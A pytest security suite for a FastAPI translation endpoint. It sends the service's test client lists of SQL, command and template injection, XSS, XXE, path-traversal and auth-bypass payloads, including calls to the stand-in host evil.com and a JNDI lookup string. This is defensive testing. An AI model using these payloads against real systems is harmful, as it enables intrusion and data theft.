"""
Security Testing Framework
Tests security aspects including injection attempts, authentication bypasses, and data validation
"""

import pytest
import json
import base64
import hashlib
import hmac
import time
import re
from unittest.mock import patch, MagicMock
from typing import Dict, List, Any, Optional, Union
import secrets
import string
import urllib.parse
from concurrent.futures import ThreadPoolExecutor

from fastapi.testclient import TestClient
from app.main import app


class SecurityTestVectors:
    """Security test vector generator"""
    
    def __init__(self):
        self.injection_payloads = self._generate_injection_payloads()
        self.authentication_bypasses = self._generate_auth_bypasses()
        self.data_validation_attacks = self._generate_validation_attacks()
        self.encoding_attacks = self._generate_encoding_attacks()
    
    def _generate_injection_payloads(self) -> List[Dict[str, str]]:
        """Generate various injection attack payloads"""
        return [
            # SQL Injection
            {"type": "sql", "payload": "'; DROP TABLE users; --"},
            {"type": "sql", "payload": "' OR '1'='1' --"},
            {"type": "sql", "payload": "'; INSERT INTO users VALUES ('admin', 'password'); --"},
            {"type": "sql", "payload": "' UNION SELECT * FROM information_schema.tables --"},
            
            # NoSQL Injection
            {"type": "nosql", "payload": "{'$ne': null}"},
            {"type": "nosql", "payload": "{'$gt': ''}"},
            {"type": "nosql", "payload": "{'$regex': '.*'}"},
            
            # Command Injection
            {"type": "command", "payload": "; ls -la /"},
            {"type": "command", "payload": "| cat /etc/passwd"},
            {"type": "command", "payload": "&& whoami"},
            {"type": "command", "payload": "`curl evil.com`"},
            
            # XSS
            {"type": "xss", "payload": "<script>alert('XSS')</script>"},
            {"type": "xss", "payload": "javascript:alert('XSS')"},
            {"type": "xss", "payload": "<img src=x onerror=alert('XSS')>"},
            {"type": "xss", "payload": "';alert('XSS');//"},
            
            # LDAP Injection
            {"type": "ldap", "payload": "*()|&'"},
            {"type": "ldap", "payload": "*)(uid=*))(|(uid=*"},
            
            # XML Injection
            {"type": "xml", "payload": "<?xml version='1.0'?><!DOCTYPE root [<!ENTITY test SYSTEM 'file:///etc/passwd'>]><root>&test;</root>"},
            {"type": "xml", "payload": "<![CDATA[malicious content]]>"},
            
            # JSON Injection
            {"type": "json", "payload": '{"__proto__": {"isAdmin": true}}'},
            {"type": "json", "payload": '{"constructor": {"prototype": {"isAdmin": true}}}'},
            
            # Server-Side Template Injection (SSTI)
            {"type": "ssti", "payload": "{{7*7}}"},
            {"type": "ssti", "payload": "{{config}}"},
            {"type": "ssti", "payload": "${7*7}"},
            {"type": "ssti", "payload": "#{7*7}"},
            
            # Log Injection
            {"type": "log", "payload": "\\r\\n[CRITICAL] Fake log entry"},
            {"type": "log", "payload": "\\n\\nFake:\\tAdministrator logged in"},
        ]
    
    def _generate_auth_bypasses(self) -> List[Dict[str, Any]]:
        """Generate authentication bypass attempts"""
        return [
            # Header manipulation
            {"type": "header_manipulation", "headers": {"X-API-Key": ""}},
            {"type": "header_manipulation", "headers": {"X-API-Key": None}},
            {"type": "header_manipulation", "headers": {"X-API-Key": "null"}},
            {"type": "header_manipulation", "headers": {"X-API-Key": "undefined"}},
            {"type": "header_manipulation", "headers": {"X-API-Key": "admin"}},
            {"type": "header_manipulation", "headers": {"X-API-Key": "0"}},
            {"type": "header_manipulation", "headers": {"X-API-Key": "false"}},
            
            # Case sensitivity
            {"type": "case_bypass", "headers": {"x-api-key": "test_api_key"}},
            {"type": "case_bypass", "headers": {"X-Api-Key": "test_api_key"}},
            {"type": "case_bypass", "headers": {"X-API-KEY": "test_api_key"}},
            
            # Unicode normalization
            {"type": "unicode_bypass", "headers": {"X-API-Key": "test\u200Bapi\u200Dkey"}},  # Zero-width characters
            {"type": "unicode_bypass", "headers": {"X-API-Key": "\uFEFFtest_api_key"}},  # BOM
            
            # Multiple headers
            {"type": "duplicate_headers", "headers": [("X-API-Key", "invalid"), ("X-API-Key", "test_api_key")]},
            {"type": "duplicate_headers", "headers": [("X-API-Key", "test_api_key"), ("X-API-Key", "invalid")]},
            
            # JWT-like bypass attempts (even though we don't use JWT)
            {"type": "jwt_bypass", "headers": {"Authorization": "Bearer eyJhbGciOiJub25lIn0.eyJpc3MiOiJhdHRhY2tlciJ9."}},
            {"type": "jwt_bypass", "headers": {"Authorization": "Bearer null"}},
            
            # SQL injection in auth header
            {"type": "sql_in_auth", "headers": {"X-API-Key": "test_api_key'; DROP TABLE sessions; --"}},
        ]
    
    def _generate_validation_attacks(self) -> List[Dict[str, Any]]:
        """Generate data validation attacks"""
        return [
            # Integer overflow
            {"type": "overflow", "data": {"text": "x", "source_lang": "eng_Latn", "target_lang": "fra_Latn", "max_length": 2**31}},
            {"type": "overflow", "data": {"text": "x", "source_lang": "eng_Latn", "target_lang": "fra_Latn", "priority": 2**63}},
            
            # Negative values
            {"type": "negative", "data": {"text": "x", "source_lang": "eng_Latn", "target_lang": "fra_Latn", "timeout": -1}},
            {"type": "negative", "data": {"text": "x", "source_lang": "eng_Latn", "target_lang": "fra_Latn", "max_tokens": -100}},
            
            # Type confusion
            {"type": "type_confusion", "data": {"text": {"nested": "object"}, "source_lang": "eng_Latn", "target_lang": "fra_Latn"}},
            {"type": "type_confusion", "data": {"text": ["array", "instead", "of", "string"], "source_lang": "eng_Latn", "target_lang": "fra_Latn"}},
            {"type": "type_confusion", "data": {"text": 12345, "source_lang": "eng_Latn", "target_lang": "fra_Latn"}},
            {"type": "type_confusion", "data": {"text": True, "source_lang": "eng_Latn", "target_lang": "fra_Latn"}},
            
            # Prototype pollution
            {"type": "prototype_pollution", "data": {"__proto__": {"isAdmin": True}, "text": "test", "source_lang": "eng_Latn", "target_lang": "fra_Latn"}},
            {"type": "prototype_pollution", "data": {"constructor": {"prototype": {"admin": True}}, "text": "test", "source_lang": "eng_Latn", "target_lang": "fra_Latn"}},
            
            # Path traversal in language codes
            {"type": "path_traversal", "data": {"text": "test", "source_lang": "../../../etc/passwd", "target_lang": "fra_Latn"}},
            {"type": "path_traversal", "data": {"text": "test", "source_lang": "eng_Latn", "target_lang": "..\\\\windows\\\\system32\\\\config\\\\sam"}},
            
            # Format string attacks
            {"type": "format_string", "data": {"text": "%s%s%s%s%s%s%s", "source_lang": "eng_Latn", "target_lang": "fra_Latn"}},
            {"type": "format_string", "data": {"text": "%x%x%x%x%x%x", "source_lang": "eng_Latn", "target_lang": "fra_Latn"}},
        ]
    
    def _generate_encoding_attacks(self) -> List[Dict[str, Any]]:
        """Generate encoding-based attacks"""
        return [
            # Double encoding
            {"type": "double_encoding", "text": "%2527%2520OR%25201%253D1%2520--"},  # ''OR 1=1 --
            {"type": "double_encoding", "text": "%253Cscript%253Ealert%2528%2527XSS%2527%2529%253C%252Fscript%253E"},
            
            # Unicode encoding
            {"type": "unicode_encoding", "text": "\\u003cscript\\u003ealert(\\u0027XSS\\u0027)\\u003c/script\\u003e"},
            {"type": "unicode_encoding", "text": "\\x3cscript\\x3ealert(\\x27XSS\\x27)\\x3c/script\\x3e"},
            
            # Base64 attacks
            {"type": "base64", "text": base64.b64encode(b"<script>alert('XSS')</script>").decode()},
            {"type": "base64", "text": base64.b64encode(b"'; DROP TABLE users; --").decode()},
            
            # Hex encoding
            {"type": "hex", "text": "\\x3c\\x73\\x63\\x72\\x69\\x70\\x74\\x3e\\x61\\x6c\\x65\\x72\\x74\\x28\\x27\\x58\\x53\\x53\\x27\\x29\\x3c\\x2f\\x73\\x63\\x72\\x69\\x70\\x74\\x3e"},
            
            # Mixed encoding
            {"type": "mixed", "text": "%3Cscript%3Ealert\\u0028\\x27XSS\\x27\\u0029%3C/script%3E"},
        ]
    
    def generate_fuzzing_payloads(self, count: int = 50) -> List[str]:
        """Generate random fuzzing payloads"""
        payloads = []
        
        for _ in range(count):
            # Random length between 1 and 10000
            length = secrets.randbelow(10000) + 1
            
            # Mix of printable and non-printable characters
            chars = string.printable + ''.join(chr(i) for i in range(256))
            payload = ''.join(secrets.choice(chars) for _ in range(length))
            
            payloads.append(payload)
        
        return payloads


class SecurityAnalyzer:
    """Analyzes security test results"""
    
    def __init__(self):
        self.vulnerability_patterns = {
            'injection': [
                r'error.*sql',
                r'mysql.*error',
                r'postgresql.*error',
                r'syntax.*error.*query',
                r'unclosed.*quotation',
                r'ORA-\d{5}',  # Oracle errors
            ],
            'information_disclosure': [
                r'/etc/passwd',
                r'/proc/version',
                r'root:.*:0:0:',
                r'Administrator:',
                r'stack.*trace',
                r'exception.*\n.*at.*line',
            ],
            'command_execution': [
                r'uid=\d+.*gid=\d+',
                r'root.*bash',
                r'Microsoft.*Windows',
                r'total.*\d+K',  # ls output
            ],
            'xss_reflection': [
                r'<script>.*</script>',
                r'javascript:',
                r'onerror=',
                r'onload=',
            ]
        }
    
    def analyze_response(self, response, attack_type: str, payload: str) -> Dict[str, Any]:
        """Analyze response for security vulnerabilities"""
        analysis = {
            'vulnerable': False,
            'vulnerability_type': None,
            'evidence': [],
            'risk_level': 'low'
        }
        
        if not response or not hasattr(response, 'text') or not response.text:
            return analysis
        
        response_text = response.text.lower()
        
        # Check for vulnerability patterns
        for vuln_type, patterns in self.vulnerability_patterns.items():
            for pattern in patterns:
                if re.search(pattern, response_text, re.IGNORECASE):
                    analysis['vulnerable'] = True
                    analysis['vulnerability_type'] = vuln_type
                    analysis['evidence'].append(f"Pattern '{pattern}' matched")
                    analysis['risk_level'] = 'high' if vuln_type in ['injection', 'command_execution'] else 'medium'
        
        # Check for payload reflection (potential XSS)
        if payload.lower() in response_text:
            analysis['vulnerable'] = True
            analysis['vulnerability_type'] = 'reflection'
            analysis['evidence'].append("Payload reflected in response")
            analysis['risk_level'] = 'medium'
        
        # Check for unusual status codes that might indicate vulnerabilities
        if hasattr(response, 'status_code'):
            if response.status_code == 500 and 'error' in response_text:
                analysis['vulnerable'] = True
                analysis['vulnerability_type'] = 'information_disclosure'
                analysis['evidence'].append("Internal server error with details")
                analysis['risk_level'] = 'medium'
        
        return analysis
    
    def generate_security_report(self, test_results: List[Dict[str, Any]]) -> Dict[str, Any]:
        """Generate comprehensive security report"""
        report = {
            'total_tests': len(test_results),
            'vulnerabilities_found': 0,
            'vulnerability_breakdown': {},
            'risk_assessment': {'high': 0, 'medium': 0, 'low': 0},
            'recommendations': [],
            'secure_tests': 0
        }
        
        for result in test_results:
            if result.get('analysis', {}).get('vulnerable', False):
                report['vulnerabilities_found'] += 1
                vuln_type = result['analysis']['vulnerability_type']
                risk_level = result['analysis']['risk_level']
                
                if vuln_type not in report['vulnerability_breakdown']:
                    report['vulnerability_breakdown'][vuln_type] = 0
                report['vulnerability_breakdown'][vuln_type] += 1
                report['risk_assessment'][risk_level] += 1
            else:
                report['secure_tests'] += 1
        
        # Generate recommendations
        if report['vulnerabilities_found'] > 0:
            report['recommendations'].extend([
                "Implement input validation and sanitization",
                "Use parameterized queries to prevent injection",
                "Add rate limiting to prevent brute force attacks",
                "Implement proper error handling to prevent information disclosure",
                "Regular security testing and code reviews"
            ])
        
        report['security_score'] = (report['secure_tests'] / report['total_tests'] * 100) if report['total_tests'] > 0 else 0
        
        return report


class TestSecurityFramework:
    """Security Testing Framework Test Suite"""
    
    @pytest.fixture(autouse=True)
    def setup(self, enhanced_mock_objects):
        """Setup for security tests"""
        self.security_vectors = SecurityTestVectors()
        self.security_analyzer = SecurityAnalyzer()
        self.enhanced_mock_objects = enhanced_mock_objects
    
    def test_injection_attack_prevention(self, test_client, enhanced_mock_objects):
        """Test prevention of various injection attacks"""
        injection_results = []
        
        for payload_info in self.security_vectors.injection_payloads:
            payload = payload_info['payload']
            attack_type = payload_info['type']
            
            # Test injection in text field
            response = test_client.post(
                "/translate",
                json={
                    "text": payload,
                    "source_lang": "eng_Latn",
                    "target_lang": "fra_Latn"
                },
                headers={"X-API-Key": "test_api_key"}
            )
            
            analysis = self.security_analyzer.analyze_response(response, attack_type, payload)
            
            injection_results.append({
                'attack_type': attack_type,
                'payload': payload[:100] + "..." if len(payload) > 100 else payload,
                'status_code': response.status_code,
                'analysis': analysis,
                'safe_response': not analysis['vulnerable']
            })
        
        # Validate injection prevention
        safe_responses = sum(1 for r in injection_results if r['safe_response'])
        safety_rate = safe_responses / len(injection_results)
        
        assert safety_rate >= 0.95, f"Injection attack prevention insufficient: {safety_rate:.2%} safe responses"
        
        # No high-risk vulnerabilities should be found
        high_risk_vulns = sum(1 for r in injection_results if r['analysis']['risk_level'] == 'high')
        assert high_risk_vulns == 0, f"High-risk injection vulnerabilities found: {high_risk_vulns}"
    
    def test_authentication_bypass_prevention(self, test_client, enhanced_mock_objects):
        """Test prevention of authentication bypass attempts"""
        bypass_results = []
        
        for bypass_info in self.security_vectors.authentication_bypasses:
            bypass_type = bypass_info['type']
            headers = bypass_info['headers']
            
            # Handle different header formats
            if isinstance(headers, list):
                # Multiple headers with same name
                test_headers = {}
                for header_name, header_value in headers:
                    if header_name in test_headers:
                        # FastAPI/Starlette will use the last value
                        test_headers[header_name] = header_value
                    else:
                        test_headers[header_name] = header_value
            else:
                test_headers = headers
            
            response = test_client.post(
                "/translate",
                json={
                    "text": "Authentication bypass test",
                    "source_lang": "eng_Latn",
                    "target_lang": "fra_Latn"
                },
                headers=test_headers
            )
            
            bypass_results.append({
                'bypass_type': bypass_type,
                'headers': str(headers),
                'status_code': response.status_code,
                'bypass_prevented': response.status_code in [401, 403],
                'authenticated': response.status_code == 200
            })
        
        # Most bypass attempts should be prevented
        prevented_bypasses = sum(1 for r in bypass_results if r['bypass_prevented'])
        prevention_rate = prevented_bypasses / len(bypass_results)
        
        assert prevention_rate >= 0.8, f"Authentication bypass prevention insufficient: {prevention_rate:.2%}"
        
        # No bypass should result in successful authentication
        successful_bypasses = sum(1 for r in bypass_results if r['authenticated'])
        assert successful_bypasses <= 1, f"Authentication bypasses succeeded: {successful_bypasses}"
    
    def test_data_validation_attacks(self, test_client, enhanced_mock_objects):
        """Test data validation against various attacks"""
        validation_results = []
        
        for attack_info in self.security_vectors.data_validation_attacks:
            attack_type = attack_info['type']
            attack_data = attack_info['data']
            
            response = test_client.post(
                "/translate",
                json=attack_data,
                headers={"X-API-Key": "test_api_key"}
            )
            
            # Check if validation properly rejected invalid data
            validation_results.append({
                'attack_type': attack_type,
                'status_code': response.status_code,
                'properly_validated': response.status_code in [400, 422],
                'data_sample': str(attack_data)[:200] + "..." if len(str(attack_data)) > 200 else str(attack_data)
            })
        
        # Most validation attacks should be properly handled
        proper_validation = sum(1 for r in validation_results if r['properly_validated'])
        validation_rate = proper_validation / len(validation_results)
        
        assert validation_rate >= 0.85, f"Data validation insufficient: {validation_rate:.2%} properly validated"
    
    def test_encoding_attack_prevention(self, test_client, enhanced_mock_objects):
        """Test prevention of encoding-based attacks"""
        encoding_results = []
        
        for encoding_info in self.security_vectors.encoding_attacks:
            encoding_type = encoding_info['type']
            encoded_text = encoding_info['text']
            
            response = test_client.post(
                "/translate",
                json={
                    "text": encoded_text,
                    "source_lang": "eng_Latn",
                    "target_lang": "fra_Latn"
                },
                headers={"X-API-Key": "test_api_key"}
            )
            
            analysis = self.security_analyzer.analyze_response(response, encoding_type, encoded_text)
            
            encoding_results.append({
                'encoding_type': encoding_type,
                'status_code': response.status_code,
                'analysis': analysis,
                'safe_handling': not analysis['vulnerable']
            })
        
        # Encoding attacks should be safely handled
        safe_handling = sum(1 for r in encoding_results if r['safe_handling'])
        safety_rate = safe_handling / len(encoding_results)
        
        assert safety_rate >= 0.9, f"Encoding attack prevention insufficient: {safety_rate:.2%}"
    
    def test_fuzzing_input_resilience(self, test_client, enhanced_mock_objects):
        """Test resilience against fuzzing attacks"""
        fuzzing_payloads = self.security_vectors.generate_fuzzing_payloads(25)  # Reduced for speed
        fuzzing_results = []
        
        for i, payload in enumerate(fuzzing_payloads):
            try:
                response = test_client.post(
                    "/translate",
                    json={
                        "text": payload,
                        "source_lang": "eng_Latn",
                        "target_lang": "fra_Latn"
                    },
                    headers={"X-API-Key": "test_api_key"},
                    timeout=5.0  # Prevent hanging on malformed input
                )
                
                fuzzing_results.append({
                    'payload_id': i,
                    'status_code': response.status_code,
                    'response_size': len(response.content) if response.content else 0,
                    'handled_gracefully': response.status_code in [200, 400, 422],
                    'crashed': False
                })
                
            except Exception as e:
                fuzzing_results.append({
                    'payload_id': i,
                    'status_code': None,
                    'response_size': 0,
                    'handled_gracefully': False,
                    'crashed': True,
                    'error': str(e)[:200]
                })
        
        # System should handle fuzzing gracefully
        graceful_handling = sum(1 for r in fuzzing_results if r['handled_gracefully'])
        crashes = sum(1 for r in fuzzing_results if r['crashed'])
        
        graceful_rate = graceful_handling / len(fuzzing_results)
        assert graceful_rate >= 0.8, f"Poor fuzzing resilience: {graceful_rate:.2%} handled gracefully"
        assert crashes <= len(fuzzing_results) * 0.1, f"Too many crashes during fuzzing: {crashes}"
    
    def test_concurrent_security_attacks(self, test_client, enhanced_mock_objects):
        """Test security under concurrent attack scenarios"""
        # Mix of different attack types for concurrent testing
        concurrent_attacks = [
            {"text": "'; DROP TABLE users; --", "source_lang": "eng_Latn", "target_lang": "fra_Latn"},
            {"text": "<script>alert('XSS')</script>", "source_lang": "eng_Latn", "target_lang": "fra_Latn"},
            {"text": "../../../etc/passwd", "source_lang": "eng_Latn", "target_lang": "fra_Latn"},
            {"text": "{{7*7}}", "source_lang": "eng_Latn", "target_lang": "fra_Latn"},
            {"text": "${jndi:ldap://evil.com}", "source_lang": "eng_Latn", "target_lang": "fra_Latn"},
        ]
        
        def execute_concurrent_attack(attack_data: Dict[str, str]) -> Dict[str, Any]:
            start_time = time.time()
            
            try:
                response = test_client.post(
                    "/translate",
                    json=attack_data,
                    headers={"X-API-Key": "test_api_key"}
                )
                
                execution_time = time.time() - start_time
                
                return {
                    'attack_payload': attack_data['text'][:50] + "..." if len(attack_data['text']) > 50 else attack_data['text'],
                    'status_code': response.status_code,
                    'execution_time': execution_time,
                    'handled_securely': response.status_code in [200, 400, 422],
                    'response_size': len(response.content) if response.content else 0
                }
                
            except Exception as e:
                execution_time = time.time() - start_time
                return {
                    'attack_payload': attack_data['text'][:50] + "..." if len(attack_data['text']) > 50 else attack_data['text'],
                    'status_code': None,
                    'execution_time': execution_time,
                    'handled_securely': False,
                    'error': str(e)
                }
        
        # Execute concurrent attacks
        with ThreadPoolExecutor(max_workers=10) as executor:
            # Repeat each attack type multiple times
            all_attacks = concurrent_attacks * 4  # 20 total concurrent attacks
            futures = [executor.submit(execute_concurrent_attack, attack) for attack in all_attacks]
            concurrent_results = [future.result() for future in futures]
        
        # Analyze concurrent attack handling
        secure_handling = sum(1 for r in concurrent_results if r['handled_securely'])
        avg_response_time = sum(r['execution_time'] for r in concurrent_results) / len(concurrent_results)
        max_response_time = max(r['execution_time'] for r in concurrent_results)
        
        security_rate = secure_handling / len(concurrent_results)
        assert security_rate >= 0.85, f"Poor concurrent security handling: {security_rate:.2%}"
        assert avg_response_time < 3.0, f"Slow concurrent attack response: {avg_response_time:.3f}s"
        assert max_response_time < 10.0, f"Excessive max response time under attack: {max_response_time:.3f}s"
    
    def test_rate_limiting_security(self, test_client, enhanced_mock_objects):
        """Test rate limiting as a security measure"""
        # Simulate brute force attack pattern
        brute_force_results = []
        
        for i in range(15):  # Exceed rate limit
            start_time = time.time()
            response = test_client.post(
                "/translate",
                json={
                    "text": f"Brute force attempt {i}",
                    "source_lang": "eng_Latn",
                    "target_lang": "fra_Latn"
                },
                headers={"X-API-Key": f"brute_force_key_{i % 3}"}  # Vary keys slightly
            )
            execution_time = time.time() - start_time
            
            brute_force_results.append({
                'attempt': i,
                'status_code': response.status_code,
                'execution_time': execution_time,
                'rate_limited': response.status_code == 429
            })
        
        # Rate limiting should kick in
        rate_limited_count = sum(1 for r in brute_force_results if r['rate_limited'])
        assert rate_limited_count >= 5, f"Rate limiting not effective: {rate_limited_count} rate limited responses"
        
        # Later attempts should be faster (due to rate limiting)
        later_attempts = brute_force_results[10:]
        avg_later_time = sum(r['execution_time'] for r in later_attempts) / len(later_attempts)
        assert avg_later_time < 1.0, f"Rate limiting not reducing response time: {avg_later_time:.3f}s"
    
    def test_comprehensive_security_report(self, test_client, enhanced_mock_objects):
        """Generate comprehensive security test report"""
        all_test_results = []
        
        # Run subset of each security test type for reporting
        test_categories = [
            ('injection', self.security_vectors.injection_payloads[:5]),
            ('encoding', self.security_vectors.encoding_attacks[:3]),
            ('validation', self.security_vectors.data_validation_attacks[:5]),
        ]
        
        for category, test_vectors in test_categories:
            for vector in test_vectors:
                if category == 'injection':
                    payload = vector['payload']
                    test_data = {"text": payload, "source_lang": "eng_Latn", "target_lang": "fra_Latn"}
                elif category == 'encoding':
                    test_data = {"text": vector['text'], "source_lang": "eng_Latn", "target_lang": "fra_Latn"}
                elif category == 'validation':
                    test_data = vector['data']
                
                response = test_client.post(
                    "/translate",
                    json=test_data,
                    headers={"X-API-Key": "test_api_key"}
                )
                
                analysis = self.security_analyzer.analyze_response(
                    response, 
                    vector.get('type', category), 
                    str(test_data)
                )
                
                all_test_results.append({
                    'category': category,
                    'test_type': vector.get('type', category),
                    'analysis': analysis
                })
        
        # Generate security report
        security_report = self.security_analyzer.generate_security_report(all_test_results)
        
        # Validate security report
        assert security_report['security_score'] >= 85.0, f"Security score too low: {security_report['security_score']:.1f}%"
        assert security_report['risk_assessment']['high'] == 0, f"High-risk vulnerabilities found: {security_report['risk_assessment']['high']}"
        
        # Print report for visibility (in test output)
        print(f"\n=== Security Test Report ===")
        print(f"Total Tests: {security_report['total_tests']}")
        print(f"Security Score: {security_report['security_score']:.1f}%")
        print(f"Vulnerabilities Found: {security_report['vulnerabilities_found']}")
        print(f"Risk Assessment: {security_report['risk_assessment']}")
        
        if security_report['vulnerabilities_found'] > 0:
            print(f"Vulnerability Breakdown: {security_report['vulnerability_breakdown']}")
            print(f"Recommendations: {security_report['recommendations']}")
        
        print("=== End Security Report ===\n")